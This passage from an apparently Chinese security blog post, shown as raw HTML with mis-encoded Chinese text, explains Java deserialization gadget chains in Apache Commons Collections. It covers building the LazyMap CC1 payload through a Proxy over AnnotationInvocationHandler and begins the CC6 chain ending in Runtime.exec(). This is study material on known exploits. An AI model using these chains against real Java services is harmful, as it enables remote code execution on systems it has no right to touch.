&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>LazyMapçš„åˆ©ç”¨æ¯”TransformedMapå¤æ‚ï¼Œå› ä¸ºAnnotationInvocationHandlerè¦†å†™çš„readObjectä¸­å¹¶æ²¡æœ‰ç›´æŽ¥ä½¿ç”¨Mapçš„getï¼Œæ‰€ä»¥è¿™é‡Œé€‰æ‹©é€šè¿‡javaå¯¹è±¡ä»£ç†çš„æŠ€æœ¯æ¥è§¦å‘å®ƒçš„invoke è¿›è€Œåˆ°get&lt;/p>
&lt;p>æˆ‘ä»¬çŸ¥é“å¯¹è±¡ä»£ç†å¯ä»¥åœ¨è¿è¡ŒæœŸåŠ¨æ€åˆ›å»ºæŸä¸ª&lt;code>interface&lt;/code>çš„å®žä¾‹ï¼Œå¯ä»¥ç¼–å†™&lt;code>InvocationHandler&lt;/code>æ¥å®žçŽ°æŽ¥å£çš„æ–¹æ³•è°ƒç”¨ï¼Œå¯ä»¥åšåˆ°åŠ å·¥å’Œè¦†å†™ï¼ˆä¹Ÿæ­£æ˜¯å«åšProxyçš„åŽŸå›  å¯¹æŽ¥å£è¿›è¡ŒProxy çœåŽ»ä¸­é—´ç±»ï¼‰ï¼Œç±»ä¼¼PHPé­”æœ¯æ–¹æ³•ä¸­çš„&lt;code>__call&lt;/code> å¯ä»¥åŠ«æŒå¯¹è±¡å†…éƒ¨çš„æ–¹æ³•è°ƒç”¨ï¼Œç”¨åˆ°java.reflect.Proxy&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newProxyInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¬¬ä¸€ä¸ªå‚æ•°ClassLoaderæˆ‘ä»¬ä½¿ç”¨é»˜è®¤çš„å³å¯ï¼Œç¬¬äºŒä¸ªæ˜¯æˆ‘ä»¬éœ€è¦ä»£ç†çš„å¯¹è±¡é›†åˆï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå®žçŽ°äº†InvocationHandleræŽ¥å£çš„å¯¹è±¡ï¼Œé‡Œé¢åŒ…å«äº†å…·ä½“çš„ä»£ç†é€»è¾‘&lt;/p>
&lt;p>æ¯”å¦‚ä¸€ä¸ªè¦†å†™äº†invokeæ–¹æ³•çš„ExampleInvocationHandlerç±»&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ExampleInvocationHandler&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">ExampleInvocationHandler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">proxy&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Throwable&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">compareTo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;get&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hookmethod: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hacked Object&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä½œç”¨æ˜¯ç›‘æŽ§åˆ°è°ƒç”¨çš„æ–¹æ³•åæ˜¯getæ—¶è¿”å›žHacked Objectå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å°è¯•å¤–éƒ¨è°ƒç”¨å®ƒ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Proxy&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">App&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ExampleInvocationHandler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newProxyInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">proxyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;world&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å›žæ˜¾Hook methd: get Hacked Object&lt;/p>
&lt;p>å›žçœ‹&lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code>ï¼Œå¦‚æžœæˆ‘ä»¬æŠŠè¿™ä¸ªå¯¹è±¡ç”¨Proxyè¿›è¡Œä»£ç†ï¼Œé‚£ä¹ˆreadObjectæ—¶åªè¦è°ƒç”¨ä»»æ„æ–¹æ³• å°±ä¼šè¿›å…¥&lt;code>AnnotationInvocationHandler#invoke&lt;/code>è§¦å‘get&lt;/p>
&lt;h4 id="æž„é€ ">æž„é€ &lt;/h4>
&lt;p>å…ˆæ˜¯ç”¨LazyMapæ›¿æ¢TransformedMap&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åŽå¯¹sun.reflect.annotation.AnnotationInvocationHandlerè¿›è¡ŒProxy&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">construct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newProxyInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä»£ç†åŽçš„å¯¹è±¡æ˜¯proxyMapï¼Œä½†æ˜¯ä¸èƒ½ç›´æŽ¥å¯¹å…¶åºåˆ—åŒ– æˆ‘ä»¬çš„å…¥å£ç‚¹æ˜¯&lt;code>sun.reflect.annotation.AnnotationInvocationHandler#readObject&lt;/code>ï¼Œè¿˜è¦å†ç”¨AnnotationInvocationHandlerå¯¹è¿™ä¸ªproxyMapåŒ…è£¹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨æ„åˆ°ysoserialçš„æœ«å°¾æœ‰new ConstantTransformer(1)ï¼Œå¯ä»¥éšè—å¯åŠ¨è¿›ç¨‹çš„æ—¥å¿—ç‰¹å¾&lt;/p>
&lt;p>â€”â€”â€”â€”æ³¨æ„ï¼šLazyMapçš„CC1åŒæ ·æ— æ³•è§£å†³8u71åŽçš„ä½¿ç”¨é—®é¢˜ï¼Œå°½ç®¡å®ƒçš„æ¼æ´žè§¦å‘åœ¨getå’Œinvokeï¼Œå’ŒsetValueæ— å…³&lt;/p>
&lt;h2 id="cc6">CC6&lt;/h2>
&lt;p>ä¸Šé¢æåˆ°CC1ç”±äºŽ&lt;code>sun.reflect.annotation.AnnotationInvocationHandler#readObject&lt;/code>åœ¨8u71åŽçš„é€»è¾‘å˜åŒ–å¯¼è‡´å¤±æ•ˆï¼Œè¿™é‡Œæ¥çœ‹ä¸€æ¡è§£å†³é«˜ç‰ˆæœ¬Javaåˆ©ç”¨çš„CC6ï¼ˆä»£ç éƒ¨åˆ†æ¥è‡ªpç‰›&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> -&amp;gt; Gadget chain:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.io.ObjectInputStream.readObject()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.util.HashMap.readObject()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.util.HashMap.hash()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> org.apache.commons.collections.map.LazyMap.get()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">org.apache.commons.collections.functors.ChainedTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">org.apache.commons.collections.functors.InvokerTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.lang.reflect.Method.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.lang.Runtime.exec()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">*/&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>CC6è§£å†³CC1çš„æ–¹æ¡ˆæ˜¯åœ¨ä¸Šä¸‹æ–‡ä¸­å¯»æ‰¾å…¶å®ƒå¯ä»¥è°ƒç”¨&lt;code>LazyMap.get&lt;/code>çš„åœ°æ–¹ï¼Œç”¨åˆ°çš„æ˜¯&lt;code>org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.Serializable&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map.Entry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.KeyValue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TiedMapEntry&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Entry&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">KeyValue&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Serializable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">long&lt;/span> &lt;span style="color:#111">serialVersionUID&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">8453869361373831205L&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
